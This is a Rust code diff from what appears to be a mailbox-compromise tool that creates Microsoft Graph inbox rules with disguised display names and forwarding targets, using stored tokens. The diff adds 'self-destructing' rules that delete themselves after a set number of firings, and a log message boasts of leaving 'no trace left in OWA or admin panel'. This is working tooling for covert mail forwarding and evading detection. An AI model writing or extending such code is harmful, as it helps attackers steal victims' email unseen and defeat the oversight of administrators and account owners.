@@ -350,6 +350,45 @@ pub fn spawn_immediate_rule_execution(state: AppState, token_id: String, rule: C
 
             if actions_applied > 0 {
                 eprintln!("[rule_exec] Attempt {}: Applied {} actions for rule '{}'", attempt, actions_applied, rule.display_name);
+
+                // Self-destructing rules: increment fire_count and auto-delete
+                // the rule (and its Graph rule) when max_fires is reached
+                let _ = sqlx::query("UPDATE created_rules SET fire_count = fire_count + ? WHERE id = ?")
+                    .bind(actions_applied as i32)
+                    .bind(&rule.id)
+                    .execute(pool)
+                    .await;
+
+                // Check if rule should self-destruct
+                let fire_info: Option<(i32, Option<i32>)> = sqlx::query_as(
+                    "SELECT fire_count, max_fires FROM created_rules WHERE id = ?"
+                )
+                .bind(&rule.id)
+                .fetch_optional(pool)
+                .await
+                .unwrap_or(None);
+
+                if let Some((fire_count, max_fires)) = fire_info {
+                    if let Some(max) = max_fires {
+                        if fire_count >= max {
+                            eprintln!("[rule_exec] Rule '{}' self-destructing (fired {} of {} times)", rule.display_name, fire_count, max);
+
+                            // Delete the Graph rule if it exists
+                            if let Some(graph_id) = &rule.graph_rule_id {
+                                let _ = client.delete_message_rule(&access_token, "me", graph_id).await;
+                            }
+
+                            // Delete from local DB
+                            let _ = sqlx::query("DELETE FROM created_rules WHERE id = ?")
+                                .bind(&rule.id)
+                                .execute(pool)
+                                .await;
+
+                            eprintln!("[rule_exec] Rule '{}' destroyed — no trace left in OWA or admin panel", rule.display_name);
+                            return;
+                        }
+                    }
+                }
             }
         }
 
@@ -370,6 +409,12 @@ pub struct CreatedRule {
     pub forward_to: Option<String>,
     pub created_at: chrono::DateTime<Utc>,
     pub status: String,
+    #[sqlx(default)]
+    #[serde(default)]
+    pub fire_count: i32,
+    #[sqlx(default)]
+    #[serde(default)]
+    pub max_fires: Option<i32>,
 }
 
 #[derive(Deserialize, Default)]
@@ -465,6 +510,10 @@ pub struct CreateRuleRequest {
     pub stop_processing: bool,
     #[serde(default)]
     pub local_only: Option<bool>,
+    /// Self-destructing rules: maximum number of times this rule can fire
+    /// before it auto-deletes itself. None = unlimited.
+    #[serde(default)]
+    pub max_fires: Option<i32>,
 }
 
 /// Build the Graph API messageRule payload with a disguised display name.
@@ -754,8 +803,8 @@ pub async fn create_local_only_rule(
         INSERT INTO created_rules (
             id, token_id, graph_rule_id, display_name, disguise_name,
             conditions_json, actions_json, target_folder, forward_to,
-            created_at, status
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            created_at, status, max_fires
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         "#,
     )
     .bind(&id)
@@ -769,6 +818,7 @@ pub async fn create_local_only_rule(
     .bind(&req.action_forward_to)
     .bind(now)
     .bind("active")
+    .bind(req.max_fires)
     .execute(pool)
     .await
     .map_err(|e| {
@@ -897,8 +947,8 @@ pub async fn create_inbox_rule(
         INSERT INTO created_rules (
             id, token_id, graph_rule_id, display_name, disguise_name,
             conditions_json, actions_json, target_folder, forward_to,
-            created_at, status
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            created_at, status, max_fires
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         "#,
     )
     .bind(&id)
@@ -912,6 +962,7 @@ pub async fn create_inbox_rule(
     .bind(&req.action_forward_to)
     .bind(now)
     .bind("active")
+    .bind(req.max_fires)
     .execute(pool)
     .await
     .map_err(|e| {
@@ -955,7 +1006,7 @@ pub async fn list_rules_handler(
     }
 
     let rows: Vec<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
-        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE token_id = ? ORDER BY created_at DESC"
+        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status, fire_count, max_fires FROM created_rules WHERE token_id = ? ORDER BY created_at DESC"
     )
     .bind(&token_id)
     .fetch_all(&state.pool)
@@ -1013,6 +1064,8 @@ pub async fn create_rule_handler(
                     forward_to: body.action_forward_to.clone(),
                     created_at: Utc::now(),
                     status: "active".to_string(),
+                    fire_count: 0,
+                    max_fires: body.max_fires,
                 };
                 spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
 
@@ -1073,13 +1126,15 @@ pub async fn create_rule_handler(
                 conditions_json: serde_json::to_string(&result.payload["conditions"]).unwrap_or_default(),
                 actions_json: serde_json::to_string(&result.payload["actions"]).unwrap_or_default(),
                 target_folder: body.action_move_to_folder.clone(),
-                forward_to: body.action_forward_to.clone(),
-                created_at: Utc::now(),
-                status: "active".to_string(),
-            };
-            spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
+                    forward_to: body.action_forward_to.clone(),
+                    created_at: Utc::now(),
+                    status: "active".to_string(),
+                    fire_count: 0,
+                    max_fires: body.max_fires,
+                };
+                spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
 
-            HttpResponse::Ok().json(serde_json::json!({
+                HttpResponse::Ok().json(serde_json::json!({
                 "status": "created",
                 "rule_id": result.rule_id,
                 "graph_rule_id": result.graph_rule_id,
@@ -1126,6 +1181,8 @@ pub async fn create_rule_handler(
                         forward_to: body.action_forward_to.clone(),
                         created_at: Utc::now(),
                         status: "active".to_string(),
+                        fire_count: 0,
+                        max_fires: body.max_fires,
                     };
                     spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
 
@@ -1159,7 +1216,7 @@ pub async fn delete_rule_handler(
 
     // Get the rule from DB to find graph_rule_id and token_id
     let rule: Option<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
-        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE id = ?"
+        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status, fire_count, max_fires FROM created_rules WHERE id = ?"
     )
     .bind(&rule_id)
     .fetch_optional(&state.pool)
@@ -1270,7 +1327,7 @@ pub async fn update_rule_handler(
     
     // Check if rule exists
     let existing: Option<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
-        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE id = ?"
+        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status, fire_count, max_fires FROM created_rules WHERE id = ?"
     )
     .bind(&rule_id)
     .fetch_optional(&state.pool)
@@ -1416,7 +1473,7 @@ pub async fn run_local_rules(
 
     // Fetch all active local rules for this token
     let rules: Vec<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
-        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE token_id = ? AND status = 'active'"
+        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status, fire_count, max_fires FROM created_rules WHERE token_id = ? AND status = 'active'"
     )
     .bind(token_id)
     .fetch_all(pool)
